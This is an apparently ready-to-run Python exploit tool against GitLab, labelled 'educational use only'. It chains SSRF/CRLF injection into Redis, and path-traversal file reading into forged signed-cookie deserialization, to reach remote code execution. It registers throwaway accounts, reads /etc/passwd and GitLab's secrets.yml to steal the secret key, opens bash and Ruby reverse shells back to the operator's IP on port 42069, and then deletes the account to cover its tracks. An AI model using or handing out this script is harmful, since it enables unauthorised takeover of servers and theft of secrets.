"""
Gitlab RCE+LFI version <= 11.4.7, 12.4.0-12.8.1 - EDUCATIONAL USE ONLY
CVEs: CVE-2018-19571 (SSRF) + CVE-2018-19585 (CRLF)
CVE-2020-10977
"""

import base64
import hashlib
import hmac
from html.parser import HTMLParser
import random
import string
import sys
import time
import urllib.parse
import urllib3

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class GitlabRCE:
    description = "oopsie woopsie we made a fucky wucky a wittle fucko boingo!"

    def __init__(self, gitlab_url, local_ip):
        self.url = gitlab_url
        self.local_ip = local_ip
        self.port = 42069
        # change this if the gitlab has restricted email domains
        self.email_domain = "gmail.htb"
        self.session = requests.session()
        self.username = ""
        self.password = ""
        self.projects = []
        self.issues = []

    def get_authenticity_token(self, url, i=-1):
        result = self.session.get(url, verify=False)
        parser = GitlabParse()
        token = parser.feed(result.text, i)
        if not token:
            print("could not get token!")
            self.abort()
        return token

    def randomize(self):
        sequence = string.ascii_letters + string.digits
        random_list = random.choices(sequence, k=10)
        random_string = "".join(random_list)
        return random_string

    def register_user(self):
        authenticity_token = self.get_authenticity_token(self.url + "/users/sign_in")
        self.username = self.randomize()
        self.password = self.randomize()
        email = "{}@{}".format(self.username, self.email_domain)
        data = {"new_user[email]": email, "new_user[email_confirmation]": email, "new_user[username]": self.username,
                "new_user[name]": self.username, "new_user[password]": self.password,
                "authenticity_token": authenticity_token}
        result = self.session.post(self.url + "/users", data=data, verify=False)
        print("registering {}:{} - {}".format(self.username, self.password, result.status_code))

    def login_user(self):
        authenticity_token = self.get_authenticity_token(self.url + "/users/sign_in", 0)
        data = {"authenticity_token": authenticity_token, "user[login]": self.username, "user[password]": self.password}
        result = self.session.post(self.url + "/users/sign_in", data=data, verify=False)
        print(result.status_code)

    def delete_user(self):
        authenticity_token = self.get_authenticity_token(self.url + "/profile/account")
        data = {"authenticity_token": authenticity_token, "_method": "delete", "password": self.password}
        result = self.session.post(self.url + "/users", data=data, verify=False)
        print("delete user {} - {}".format(self.username, result.status_code))

    def create_empty_project(self):
        authenticity_token = self.get_authenticity_token(self.url + "/projects/new")
        project = self.randomize()
        self.projects.append(project)
        data = {"authenticity_token": authenticity_token, "project[ci_cd_only]": "false", "project[name]": project,
                "project[path]": project, "project[visibility_level]": "0",
                "project[description]": "all your base are belong to us"}
        result = self.session.post(self.url + "/projects", data=data, verify=False)
        print("creating project {} - {}".format(project, result.status_code))

    def create_issue(self, project_id, text):
        issue_link = "{}/{}/{}/issues".format(self.url, self.username, project_id)
        authenticity_token = self.get_authenticity_token(issue_link + "/new")
        issue_title = self.randomize()
        self.issues.append(issue_title)
        data = {"authenticity_token": authenticity_token, "issue[title]": issue_title, "issue[description]": text}
        result = self.session.post(issue_link, data=data, verify=False)
        print("creating issue {} for project {} - {}".format(issue_title, project_id, result.status_code))

    def main(self):
        print("main is not implemented")

    def prepare_payload(self):
        print("prepare_payload is not implemented")

    def abort(self):
        print("Something went wrong! ABORT MISSION!")
        exit()

class GitlabRCE1147(GitlabRCE):
    description = "RCE for Version <=11.4.7"

    def exploit_project_creation(self, payload):
        authenticity_token = self.get_authenticity_token(self.url + "/projects/new")
        project = self.randomize()
        self.projects.append(project)
        payload_template = """git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
    multi
    sadd resque:gitlab:queues system_hook_push
    lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|{payload} \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1513714403.8122594,\\"enqueued_at\\":1513714403.8129568}"
    exec
    exec
    exec"""
        # using replace for formating is shit!! too bad...
        payload = payload_template.replace("{payload}", payload)
        data = {"authenticity_token": authenticity_token, "project[import_url]": payload,
                "project[ci_cd_only]": "false", "project[name]": project,
                "project[path]": project, "project[visibility_level]": "0",
                "project[description]": "all your base are belong to us"}
        result = self.session.post(self.url + "/projects", data=data, verify=False)
        print("hacking in progress - {}".format(result.status_code))

    def prepare_payload(self):
        payload = "bash -i >& /dev/tcp/{}/{} 0>&1".format(self.local_ip, self.port)
        wrapper = "echo {base64_payload} | base64 -d | /bin/bash"
        base64_payload = base64.b64encode(payload.encode()).decode("utf-8")
        payload = wrapper.format(base64_payload=base64_payload)
        return payload

    def main(self):
        self.register_user()
        self.exploit_project_creation(self.prepare_payload())
        time.sleep(10)
        self.delete_user()


class GitlabRCE1281LFI(GitlabRCE):
    description = "LFI for version 10.4-12.8.1 and maybe more"

    def __init__(self, gitlab_url, local_ip, file_to_lfi="/etc/passwd"):
        super(GitlabRCE1281LFI, self).__init__(gitlab_url, local_ip)
        self.file_to_lfi = file_to_lfi

    def get_file(self, url, filename):
        print("Grabbing file {}".format(filename))
        result = self.session.get(url, verify=False)
        return result.text

    def get_technical_id_of_project(self, project_id):
        url = "{}/{}/{}".format(self.url, self.username, project_id)
        result = self.session.get(url, verify=False)
        parser = ProjectIDParse()
        technical_id = parser.feed(result.text)
        return technical_id

    def extract_link_from_issue_json(self, issue_json, project_id):
        field = issue_json["description"]
        file_name = field[field.find("[") + 1:field.find("]")]
        file_path = field[field.find("(") + 1:field.find(")")]
        url = "{}/{}/{}{}".format(self.url, self.username, project_id, file_path)
        return url, file_name

    def lfi_path(self):
        return "![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../..{})".format(
            self.file_to_lfi)

    def exploit_move_issue(self):
        project = self.projects[0]
        other_project = self.projects[-1]
        url = "{}/{}/{}/issues/1".format(self.url, self.username, project)
        technical_project_id_other_project = self.get_technical_id_of_project(other_project)
        authenticity_token = self.get_authenticity_token(url)
        issue_json = {"move_to_project_id": technical_project_id_other_project}
        self.session.headers["X-CSRF-Token"] = authenticity_token
        self.session.headers["Referer"] = url
        result = self.session.post(url + "/move", json=issue_json, verify=False)
        print("moving issue from {} to {} - {}".format(project, other_project, result.status_code))
        url, filename = self.extract_link_from_issue_json(result.json(), other_project)
        file_content = self.get_file(url, filename)
        return file_content

    def main(self):
        self.register_user()
        self.create_empty_project()
        self.create_empty_project()
        self.create_issue(self.projects[0], self.lfi_path())
        file_content = self.exploit_move_issue()
        print(file_content)
        self.delete_user()


class GitlabRCE1281RCE(GitlabRCE1281LFI):
    description = "RCE for version 12.4.0-12.8.1 - !!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP"

    def parse_secrets(self, secrets):
        secret_key_base = secrets[secrets.find("secret_key_base: ") + 17:secrets.find("otp_key_base") - 3]
        return secret_key_base

    def get_ruby_shit_byte(self):
        # ruby marshal REEEEEEEEEEEEEE
        length = len(self.local_ip) + len(str(self.port)) - 8
        possible_shit_bytes = "jklmnopqrstuvw"
        return possible_shit_bytes[length]

    def build_payload(self, secret):
        payload = "\x04\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0E@instanceo:\bERB\b:\t@srcI\"{ruby_shit_byte}exit if fork;c=TCPSocket.new(\"{ip}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end\x06:\x06ET:\x0E@filenameI\"\x061\x06;\tT:\f@linenoi\x06:\f@method:\vresult:\t@varI\"\f@result\x06;\tT:\x10@deprecatorIu:\x1FActiveSupport::Deprecation\x00\x06;\tT"
        payload = payload.replace("{ip}", self.local_ip).replace("{port}", str(self.port)).replace("{ruby_shit_byte}",
                                                                                                   self.get_ruby_shit_byte())
        key = hashlib.pbkdf2_hmac("sha1", password=secret.encode(), salt=b"signed cookie", iterations=1000, dklen=64)
        base64_payload = base64.b64encode(payload.encode())
        digest = hmac.new(key, base64_payload, digestmod=hashlib.sha1).hexdigest()
        return base64_payload.decode() + "--" + digest

    def send_payload(self, payload):
        cookie = {"experimentation_subject_id": payload}
        result = self.session.get(self.url + "/users/sign_in", cookies=cookie, verify=False)
        print("deploying payload - {}".format(result.status_code))

    def main(self):
        self.file_to_lfi = "/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml"
        self.register_user()
        self.create_empty_project()
        self.create_empty_project()
        self.create_issue(self.projects[0], self.lfi_path())
        file_contents = self.exploit_move_issue()
        secret = self.parse_secrets(file_contents)
        payload = self.build_payload(secret)
        self.send_payload(payload)
        self.delete_user()


class GitlabRCE1281LFIUser(GitlabRCE1281LFI):
    def main(self):
        self.file_to_lfi = self.ask_for_lfi_path()
        super(GitlabRCE1281LFIUser, self).main()

    def ask_for_lfi_path(self):
        lfi_path = input(
            "please type in the fully qualified path of the file you want to LFI. Uses {} when left empty: ".format(
                self.file_to_lfi))
        lfi_path = lfi_path.strip()
        if not lfi_path:
            return self.file_to_lfi
        return lfi_path


class GitlabVersion(GitlabRCE):
    def test(self):
        try:
            result = self.session.get(self.url, verify=False)
            if result.status_code not in [200, 302]:
                raise Exception("Host {} seems down".format(self.url))
        except Exception as e:
            print(e)
            self.abort()

    def get_version(self):
        result = self.session.get(self.url + "/help", verify=False)
        print("Getting version of {} - {}".format(self.url, result.status_code))
        parse = VersionParse()
        version = parse.feed(result.text)
        return version

    def main(self):
        self.test()
        self.register_user()
        version = self.get_version()
        print("The Version seems to be {}! Choose wisely".format(version))
        self.delete_user()
        if not version:
            print("Could not get version!")
            self.abort()


class GitlabParse(HTMLParser):
    def __init__(self):
        super(GitlabParse, self).__init__()
        self.tokens = []
        self.current_name = ""

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            for name, value in attrs:
                if self.current_name == "authenticity_token" and name == "value":
                    self.tokens.append(value)
                self.current_name = value
        elif tag == "meta":
            for name, value in attrs:
                if self.current_name == "csrf-token":
                    self.tokens.append(value)
                self.current_name = value

    def feed(self, data, i):
        super(GitlabParse, self).feed(data)
        try:
            return self.tokens[i]
        except IndexError:
            return None


class ProjectIDParse(HTMLParser):
    def __init__(self):
        super(ProjectIDParse, self).__init__()
        self.project_found = False
        self.project_id = None

    def feed(self, data):
        super(ProjectIDParse, self).feed(data)
        return self.project_id

    def handle_starttag(self, tag, attrs):
        for name, value in attrs:
            if self.project_found and name == "value":
                self.project_id = int(value)
                return
            self.project_found = name == "id" and value == "project_id"


class VersionParse(HTMLParser):
    def __init__(self):
        super(VersionParse, self).__init__()
        self.found_version = False
        self.version = None

    def handle_starttag(self, tag, attrs):
        if tag == "a":
            for name, value in attrs:
                self.found_version = name == "href" and "/tags/v" in value

    def handle_data(self, data):
        if self.found_version and not self.version:
            self.version = data

    def feed(self, data):
        super(VersionParse, self).feed(data)
        return self.version


class Runner:
    def __init__(self):
        self.available_classes = [GitlabRCE1147, GitlabRCE1281LFIUser, GitlabRCE1281RCE]
        self.local_ip = None
        self.gitlab_url = None
        self.run()

    def banner(self):
        print("Gitlab Exploit by dotPY [insert fancy ascii art]")

    def get_version(self):
        class_ = GitlabVersion(self.gitlab_url, self.local_ip)
        class_.main()

    def list_options_and_choose(self):
        number = None
        for i, class_ in enumerate(self.available_classes):
            print("[{}] - {} - {}".format(i, class_.__name__, class_.description))
        while number not in range(len(self.available_classes)):
            try:
                number = int(input("type a number and hit enter to choose exploit: "))
            except ValueError:
                pass

        return self.available_classes[number]

    def run_chosen_exploit(self, chosen_exploit):
        class_ = chosen_exploit(self.gitlab_url, self.local_ip)
        input("Start a listener on port {port} and hit enter (nc -vlnp {port})".format(port=class_.port))
        class_.main()

    def run(self):
        args = sys.argv
        if len(args) != 3:
            print("usage: {} <http://gitlab:port> <local-ip>".format(args[0]))
            return
        else:
            self.gitlab_url = args[1]
            self.local_ip = args[2]
            self.start()

    def start(self):
        self.banner()
        self.get_version()
        class_ = self.list_options_and_choose()
        self.run_chosen_exploit(class_)


r = Runner()
